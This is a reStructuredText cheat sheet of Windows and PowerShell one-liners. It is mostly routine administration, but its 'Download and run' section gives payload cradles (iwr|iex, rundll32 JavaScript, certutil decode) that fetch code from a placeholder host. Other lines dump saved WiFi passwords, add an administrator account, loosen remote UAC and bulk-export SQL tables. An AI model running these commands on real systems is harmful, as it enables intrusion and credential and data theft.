One-liners commands
===================

Here are some useful short commands for Windows systems that may be useful.


Basic PowerShell commands
-------------------------

* ``sls`` (``Select-String``): look for a pattern.

  Example:

  .. code-block:: sh

      # Search my-needle in the input
      sls my-needle

      # Search my-needle in files ending with .txt
      sls -Path *.txt -Pattern my-needle

  Documentation:

  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-6
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_regular_expressions?view=powershell-6

* ``gcm`` (``Get-Command``): List cmdlets (PowerShell commands) matching a pattern.

  Example:

  .. code-block:: sh

      # List commands using "WMI" in their names
      gcm -noun *WMI*

PowerShell also provides commands to browse the filesystem.
Here is a correspondence table between PowerShell commands and commands from other systems, that are also available in PowerShell as aliases:

+-------------------------+--------------------------------------------------+----------------------------------------------+
|                         |                     Aliases                      |                                              |
|      cmdlet             +---------+-------------------+--------------------+ Description                                  |
|                         |   PS    | ``cmd.exe``       |   UNIX shell       |                                              |
+=========================+=========+===================+====================+==============================================+
| ``Get-Location``        | ``gl``  | ``pwd``           | ``pwd``            | Get the current node.                        |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Set-Location``        | ``sl``  | ``cd``, ``chdir`` | ``cd``, ``chdir``  | Change the current node.                     |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-ChildItem``       | ``gci`` | ``dir``           | ``ls``             | List the objects stored at the current node. |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``New-Item``            | ``ni``  | ``md``, ``mkdir`` | ``mkdir``          | Create a directory.                          |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-Item``            | ``gi``  |                   |                    | Return the properties of the current item.   |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Set-Item``            | ``si``  |                   |                    | Define the content of an item.               |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Copy-Item``           | ``cpi`` | ``copy``          | ``cp``             | Copy an object.                              |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Move-Item``           | ``mi``  | ``move``          | ``mv``             | Move an object.                              |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Rename-Item``         | ``rni`` | ``rn``            | ``ren``            | Rename an object.                            |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Remove-Item``         | ``ri``  | ``del``, ``rd``,  | ``rm``, ``rmdir``  | Remove an object.                            |
|                         |         | ``erase``         |                    |                                              |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-Content``         | ``gc``  | ``type``          | ``cat``            | Get the content of an object.                |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Set-Content``         | ``sc``  |                   |                    | Define the content of an object.             |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-ItemProperty``    | ``gp``  |                   |                    | Return a property.                           |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Copy-ItemProperty``   | ``cpp`` |                   |                    | Copy a property.                             |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Move-ItemProperty``   | ``mp``  |                   |                    | Move a property.                             |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Rename-ItemProperty`` | ``rnp`` |                   |                    | Rename a property.                           |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Compare-Object``      |         | ``compare``       | ``diff``           | Compare several objects.                     |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Write-Output``        |         | ``write``         | ``echo``           | Print something to the standard output.      |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Invoke-WebRequest``   | ``iwr`` |                   | ``curl``, ``wget`` | Perform a HTTP request.                      |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+
| ``Get-Help``            |         | ``help``          | ``man``            | Get the help associated with a cmdlet.       |
+-------------------------+---------+-------------------+--------------------+----------------------------------------------+


Download and run
----------------

Download and run a script

* PowerShell (``iex`` is an alias to ``Invoke-Expression``)::

    powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"

* JavaScript through Rundll32 (used by Win32/Poweliks malware)::

    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();

* Using ``certutil``::

    certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe

Source: https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/amp/

Downloading files with PowerShell::

    $content = (New-Object Net.WebClient).DownloadString("http://webserver/file.txt")

    # Save to a file
    Invoke-WebRequest -Uri http://webserver/file.txt -OutFile file.txt -UseBasicParsing

    # With BITS (Background Intelligent Transfer Service) (ipmo = Import-Module)
    ipmo BitsTransfer;Start-BitsTransfer -Source "http://webserver/file.txt" -Destination C:\Windows\Temp\

Run a PowerShell script::

    %windir%\System32\WindowsPowerShell\v1.0\powershell.exe -Noninteractive -ExecutionPolicy Bypass –Noprofile -file MyScript.ps1


Proxy settings
--------------

Get the HTTP proxy which is currently configured::

    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable
    netsh winhttp dump

Add a HTTP proxy::

    netsh winhttp set proxy 127.0.0.1:3128


WiFi profiles
-------------

List available WiFi profiles::

    netsh wlan show profiles

Export WiFi profiles (username and password) to ``%APPDATA%\<profile>.xml``::

    cmd.exe /c netsh wlan export profile key=clear folder="%APPDATA%"

Source: https://securelist.com/shedding-skin-turlas-fresh-faces/88069/

In PowerShell, without writing any file::

    $results = (netsh wlan show profiles) |
        Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |
        %{(netsh wlan show profile name=$name key=clear)} |
        Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |
        %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}

    # Display the results or record them in files
    $results
    $results | Format-Table -Wrap
    $results | Format-Table -AutoSize
    $results | Out-GridView
    $results | Export-Csv -Path .\wifi.csv -NoTypeInformation -Encoding ASCII
    $results | Out-File -FilePath .\wifi.txt -Encoding ASCII

Sources:

* https://jocha.se/blog/tech/display-all-saved-wifi-passwords
* https://www.tenforums.com/tutorials/27997-see-wireless-network-security-key-password-windows-10-a.html
* https://community.idera.com/database-tools/powershell/ask_the_experts/f/learn_powershell_from_don_jones-24/19610/convert-one-liner-to-more-readable-code


User and group management
-------------------------

Some commands to list and manage users and groups

.. code-block:: sh

    # Get information on the current user
    whoami
    whoami /groups
    whoami /priv
    whoami /all

    # Local users and groups manager
    lusrmgr.msc

    # net command on local accounts
    net user
    net localgroup

    # net command on Active Directory accounts
    net user /domain
    net group

    # query command
    query user

    # Get information about the current sessions on a server
    qwinsta
    query session

    # PowerShell, with MS Exchange cmdlet
    # Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010
    Get-User | Export-CSV C:\Temp\AllUsers.csv -NoTypeInfo

    # WMI (PowerShell)
    Get-WmiObject Win32_UserAccount
    Get-CimInstance -ClassName Win32_UserAccount
    Get-CimInstance -ClassName Win32_Group

    # Add an adminitrator user
    net user newuser password /add
    net localgroup Administrators newuser /add

In order to login as administrator to a remote machine without using the built-in administrator (RID 500), a registry key needs to be set.
This has been described in many blog posts:

* https://support.microsoft.com/en-us/help/942817/how-to-change-the-remote-uac-localaccounttokenfilterpolicy-registry-se
* https://blogs.msdn.microsoft.com/wmi/2009/07/24/powershell-remoting-between-two-workgroup-machines/
* https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/

::

    cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
    PowerShell Set-ItemProperty –Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System –Name LocalAccountTokenFilterPolicy –Value 1 –Type DWord


Enumerate live objects
----------------------

Enumerate all processes::

    tasklist /v
    query process *
    Get-Process
    # "gps" and "ps" are aliases of Get-Process

Enumerate all services::

    Get-Service | Export-CSV C:\Temp\AllServices.csv -NoTypeInfo
    gsv | epcsv C:\Temp\AllServices.csv -NoTypeInfo


Group Policy
------------

Edit Local Group Policy::

    gpedit.msc
    secpol.msc

Export the Local Group Policy::

    secedit /export /cfg system_config.cfg

    # With at least Windows Vista or Windows Server 2008
    gpresult /H GPReport.html

    # Display RSoP summary data (Resultant Set of Policies)
    gpresult /R

    # RSoP GUI
    RSOP.msc

Work on Group Policy Objects (GPO):

.. code-block:: sh

    # Launch the Group Policy Management Console
    gpmc.msc

    # Apply the GPO
    gpupdate /force

The Remote Server Administration Tools (RSAT) provides Group Policy PowerShell Cmdlets (https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ee461027%28v=technet.10%29):

.. code-block:: sh

    Get-WindowsCapability -Online | ? Name -like 'Rsat.GroupPolicy.Management.Tools*'
    Get-GPOReport -All -ReportType Html -Path GpoReport.html

Logon scripts are located in folder ``%SystemRoot%\SYSVOL\sysvol\{domain DNS name}\Policies\{GUID of the GPO}\User\Scripts\Logon`` (on Domain controllers).
They can be implemented in VBScript (``.vbs`` extension) or PowerShell (``.ps1`` extension).
In GPMC, they are linked to a GPO using either:

* Computer Configuration -> Policies -> Windows Settings -> Scripts (Startup / Shutdown)
* User Configuration -> Policies -> Windows Settings -> Scripts (Logon/Logoff)

A third way of running scripts on a system consists in using Immediate Scheduled Tasks:

* Computer Configuration -> Preferences -> Control Panel Settings -> Scheduled Tasks


Software information
--------------------

In order to list the upgrades that have been applied, using DISM (Deployment Image Servicing and Management Tool)::

    dism /online /get-packages

In order to check for an applied update, with its KB number:

.. code-block:: sh

    dism /online /get-packages | findstr KB99999

    # systeminfo.exe enumerates the "hotfixes" too
    systeminfo.exe | findstr KB99999

    # WMI also provides such an information in
    # System.Management.ManagementObject#root\CIMV2\Win32_QuickFixEngineering
    wmic qfe get hotfixid | find "KB99999"
    wmic qfe | find "KB99999"

    # From PowerShell
    Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}

    # https://docs.microsoft.com/en-gb/powershell/module/Microsoft.PowerShell.Management/Get-HotFix?view=powershell-5.1
    Get-HotFix -id KB99999


Boot configuration
------------------

::

    msconfig


Installed software
------------------

.. code-block:: sh

    wmic product get "name,version" /format:csv > applications.csv


Firewall
--------

::

    wf.msc

    Get-NetFirewallProfile
    Show-NetFirewallRule


TCP port forwarding with netsh
------------------------------

::

    netsh interface portproxy add v4tov4 listenport=1234 listenaddress=192.0.2.42 connectport=80 connectaddress=10.13.37.1


Alternate Data Streams
----------------------

Get files with ``Zone.Identifier`` alternate data stream (ADS)::

    Get-ChildItem -Recurse | Get-Item -Stream Zone.Identifier -ErrorAction SilentlyContinue | Select-Object FileName

Read an ADS::

    Get-Content -Stream Zone.Identifier .\my-application.exe

Remove an ADS::

    Remove-Item .\my-application.exe -Stream Zone.Identifier

When downloading a file from the Internet, ``dir`` shows a filename with suffix ``:Zone.Identifier:$DATA`` and with 26 bytes (each lines are ended by ``"\r\n"``::

    [ZoneTransfer]
    ZoneId=3

The Zone identifier is 0 for the local machine, 1 for the local intranet, 2 for trusted sites, 3 for the Internet or 4 for restricted sites.

The ADS ``Zone.Identifier`` may contain other fields such as ``ReferrerUrl=...``.

The empty ADS matches the usual content of a file. This means that the content is both accessible through ``filepath`` and ``filepath::$DATA``.


CSV and table viewer
--------------------

Display a simple CSV file in a simple GUI, from a PowerShell prompt::

    Import-Csv -Path file.csv | Out-GridView
    ipcsv -Path file.csv | ogv

In order to produce a CSV from a PowerShell command::

    ... | Sort-Object -Property Timestamp | Export-Csv file.csv -notypeinformation
    ... | sort -Property Timestamp | epcsv file.csv -notypeinformation

For a table in the CLI::

    ... | Format-Table
    ... | ft

In order to show a table as a list::

    ... | Format-List
    ... | fl


MSSQL client
------------

In order to connect to a MSSQL server from a PowerShell CLI (cf. https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlconnection?view=netframework-4.7.2):

.. code-block:: sh

    $ConnectionString = "Server=MSSQL-SRV\MY-INSTANCE;Database=mydb;User ID=sa;Password=sa;"
    $SqlConnection = New-Object System.Data.SqlClient.SqlConnection($ConnectionString)
    $SqlConnection.Open()
    $SqlConnection.State
    # Result: "Open"

To run a trivial SQL query:

.. code-block:: sh

    # The verbose way:
    $SqlCmd = New-Object System.Data.SqlClient.SqlCommand
    $SqlCmd.CommandText = "SELECT 42"
    $SqlCmd.Connection = $SqlConnection
    $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter
    $SqlAdapter.SelectCommand = $SqlCmd
    $DataSet = New-Object System.Data.DataSet
    $SqlAdapter.Fill($DataSet)
    $DataSet.Tables[0] | Format-Table

    # The more-compact way:
    $SqlCmd = New-Object System.Data.SqlClient.SqlCommand("SELECT 42", $SqlConnection)
    $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($SqlCmd)
    $DataSet = New-Object System.Data.DataSet
    $SqlAdapter.Fill($DataSet)
    $DataSet.Tables[0] | Format-Table

In order to find out which tables the logged user has access, here are some queries:

* ``SELECT * FROM sys.databases``
* ``SELECT * FROM sys.tables``

The following commands export the first rows of every table to files, once a ``$SqlConnection`` has been created:

.. code-block:: sh

    $SqlCmd = New-Object System.Data.SqlClient.SqlCommand("SELECT * FROM sys.tables", $SqlConnection)
    $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($SqlCmd)
    $DataSet = New-Object System.Data.DataSet
    $SqlAdapter.Fill($DataSet)
    $AllTables = $DataSet.Tables[0] | Sort-Object -property name

    $AllTables | ForEach-Object {
        $tblName = $_.name
        $csvName = "dump_top_" + $tblName + ".csv"
        echo "Exporting data to " $csvName
        $SqlCmd = New-Object System.Data.SqlClient.SqlCommand(("SELECT TOP 10000 * FROM " + $tblName), $SqlConnection)
        $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($SqlCmd)
        $DataSet = New-Object System.Data.DataSet
        $SqlAdapter.Fill($DataSet)
        $DataSet.Tables[0] | Export-Csv $csvName -notypeinformation
    }

On a SQL Server, it is also possible to create a virtual drive (cf. https://docs.microsoft.com/en-us/sql/powershell/navigate-sql-server-powershell-paths?view=sql-server-2017):

.. code-block:: sh

    New-PSDrive -Name MYDB -Root SQLSERVER:\SQL\localhost\DEFAULT\Databases\mydb
    Set-Location MYDB:\Tables\Users
